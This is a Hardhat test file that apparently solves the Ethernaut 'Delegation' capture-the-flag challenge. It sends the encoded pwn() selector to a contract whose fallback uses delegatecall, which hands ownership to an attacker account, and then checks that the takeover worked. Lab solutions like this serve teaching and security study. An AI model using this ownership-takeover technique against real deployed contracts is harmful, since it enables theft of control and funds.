const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const CONTRACT_NAME1 = "Delegate";
const CONTRACT_NAME2 = "Delegation";

describe(CONTRACT_NAME2, () => {
  async function deployLoadFixture() {
    const [owner, attacker] = await ethers.getSigners();

    const Delegate = await ethers.getContractFactory(CONTRACT_NAME1);
    const delegate = await Delegate.deploy(owner.address);

    const Delegation = await ethers.getContractFactory(CONTRACT_NAME2);
    const delegation = await Delegation.deploy(delegate.address);

    return { delegation, delegate, owner, attacker };
  }

  it("Challenge solved", async () => {
    let {delegation, delegate, attacker} = await loadFixture(deployLoadFixture)

    // encoce the pwn() signature --> to be sent as msg.data

    const Iface = new ethers.utils.Interface(["function pwn()"]);
    const data = Iface.encodeFunctionData("pwn");

    // take ownership
    const tx =await attacker.sendTransaction({
        to: delegation.address,
        data,
        gasLimit: 1000000
    })
    await tx.wait()

    //test

    const owner = await delegation.owner()
    expect(owner).to.equal(attacker.address)
  });
});
